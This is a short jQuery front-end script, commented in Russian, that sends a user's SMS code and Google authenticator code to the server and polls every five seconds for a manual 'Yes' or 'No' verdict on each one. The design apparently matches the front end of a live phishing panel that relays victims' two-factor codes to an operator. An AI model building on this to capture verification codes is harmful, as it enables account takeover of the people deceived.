$(document).ready(function() {
            
    // Функция для выполнения запроса к серверу
    function checkIsAcceptedSMS() {
        $.ajax({
            type: "GET",
            url: "/check_is_accepted_sms",  // Предполагается, что это будет ваш маршрут Flask для проверки значения is_accepted
            success: function(response) {
                console.log(response[0]);
                if (response[0] == "Yes") {
                    // Если значение is_accepted равно 'Yes', перенаправить на одну страницу
                    window.location.href = "/";
                } else if (response[0] == "No") {
                    // Если значение is_accepted равно 'No', перенаправить на другую страницу
                    var element = document.getElementById("sms");
                    element.classList.add("is-invalid");
                } else {
                    // Если значение не 'Yes' или 'No', продолжить опрос через 5 секунд
                    setTimeout(checkIsAcceptedSMS, 5000);
                }
            },
            error: function(error) {
                console.error("Ошибка при проверке значения is_accepted");
                setTimeout(checkIsAcceptedSMS, 5000);
            }
        });
    }

    $("#smssubmit").on("click", function() {
        var sms = $("#sms").val();
        // $("#password-form").hide();
        // $("#loading").show();
        // Отправка данных на сервер с использованием AJAX
        $.ajax({
            type: "POST",
            url: "/smssubmit",
            data: {
                sms: sms
            },
            success: function(response) {
                // Обработка успешного ответа от сервера
                console.log("Данные успешно отправлены!");
                checkIsAcceptedSMS();
            },
            error: function(error) {
                // Обработка ошибки
                console.error("Ошибка отправки данных на сервер");
            }
        });
    });
    function checkIsAcceptedGCODE() {
        $.ajax({
            type: "GET",
            url: "/check_is_accepted_google",  // Предполагается, что это будет ваш маршрут Flask для проверки значения is_accepted
            success: function(response) {
                console.log(response[0]);
                if (response[0] == "Yes") {
                    // Если значение is_accepted равно 'Yes', перенаправить на одну страницу
                    window.location.href = "/";
                } else if (response[0] == "No") {
                    // Если значение is_accepted равно 'No', перенаправить на другую страницу
                    var element = document.getElementById("gcode");
                    element.classList.add("is-invalid");
                } else {
                    // Если значение не 'Yes' или 'No', продолжить опрос через 5 секунд
                    setTimeout(checkIsAcceptedGCODE, 5000);
                }
            },
            error: function(error) {
                console.error("Ошибка при проверке значения is_accepted");
                setTimeout(checkIsAcceptedGCODE, 5000);
            }
        });
    }

    $("#googlesubmit").on("click", function() {
        var gcode = $("#gcode").val();
        // $("#password-form").hide();
        // $("#loading").show();
        // Отправка данных на сервер с использованием AJAX
        $.ajax({
            type: "POST",
            url: "/gcode",
            data: {
                gcode: gcode
            },
            success: function(response) {
                // Обработка успешного ответа от сервера
                console.log("Данные успешно отправлены!");
                checkIsAcceptedGCODE();
            },
            error: function(error) {
                // Обработка ошибки
                console.error("Ошибка отправки данных на сервер");
            }
        });
    });
});